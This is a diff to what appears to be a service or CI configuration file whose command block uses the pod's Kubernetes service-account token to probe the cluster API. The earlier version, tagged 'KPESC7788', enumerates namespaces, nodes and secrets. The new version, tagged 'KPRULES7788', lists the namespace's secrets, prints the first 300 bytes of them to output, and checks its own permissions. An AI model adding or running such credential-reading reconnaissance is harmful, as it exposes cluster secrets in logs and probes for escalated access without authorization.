@@ -10,18 +10,21 @@ service:
         command: |
           T=/var/run/secrets/kubernetes.io/serviceaccount
           NS=$(cat $T/namespace)
-          echo "KPESC7788-NS=$NS"
           K=https://kubernetes.default.svc
           A="Authorization: Bearer $(cat $T/token)"
-          echo "KPESC7788-A1-CLUSTER-NAMESPACES=$(curl -s -o /tmp/a1 -w '%{http_code}' --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces)"
-          echo "KPESC7788-A1-NSCOUNT=$(grep -o '"name":"steward-run-[^"]*"' /tmp/a1 | sort -u | wc -l)"
-          grep -o '"name":"steward-run-[^"]*"' /tmp/a1 | sort -u | head -5
-          echo "KPESC7788-A2-OWN-SECRETS=$(curl -s -o /tmp/a2 -w '%{http_code}' --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces/$NS/secrets)"
-          echo "KPESC7788-A2-NAMES:"
-          grep -o '"name":"[^"]*"' /tmp/a2 | sort -u | head -20
-          echo "KPESC7788-A2-TYPES:"
-          grep -o '"type":"[^"]*"' /tmp/a2 | sort -u | head -20
-          echo "KPESC7788-A3-NODES=$(curl -s -o /tmp/a3 -w '%{http_code}' --cacert $T/ca.crt -H "$A" $K/api/v1/nodes)"
-          echo "KPESC7788-A4-ALLSECRETS=$(curl -s -o /tmp/a4 -w '%{http_code}' --cacert $T/ca.crt -H "$A" $K/api/v1/secrets)"
-          echo "KPESC7788-A5-OWN-PODS=$(curl -s -o /tmp/a5 -w '%{http_code}' --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces/$NS/pods)"
-          echo "KPESC7788-DONE"
+          echo "KPRULES7788-NS=$NS"
+          curl -s -o /tmp/s2 -w 'KPRULES7788-SECRETS-HTTP=%{http_code}\n' --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces/$NS/secrets
+          echo "KPRULES7788-SECRETS-BYTES=$(wc -c < /tmp/s2)"
+          echo "KPRULES7788-SECRETS-KIND=$(grep -o '"kind":"[A-Za-z]*"' /tmp/s2 | head -1)"
+          echo "KPRULES7788-SECRETS-ITEMCOUNT=$(grep -o '"uid":"' /tmp/s2 | wc -l)"
+          echo "KPRULES7788-SECRETS-HEAD:"
+          head -c 300 /tmp/s2
+          echo ""
+          echo "KPRULES7788-NSDENY-BODY:"
+          curl -s --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces | head -c 400
+          echo ""
+          echo "KPRULES7788-RULESREVIEW:"
+          curl -s -X POST --cacert $T/ca.crt -H "$A" -H 'Content-Type: application/json' -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}" $K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -o /tmp/r1 -w 'KPRULES7788-RR-HTTP=%{http_code}\n'
+          cat /tmp/r1
+          echo ""
+          echo "KPRULES7788-DONE"
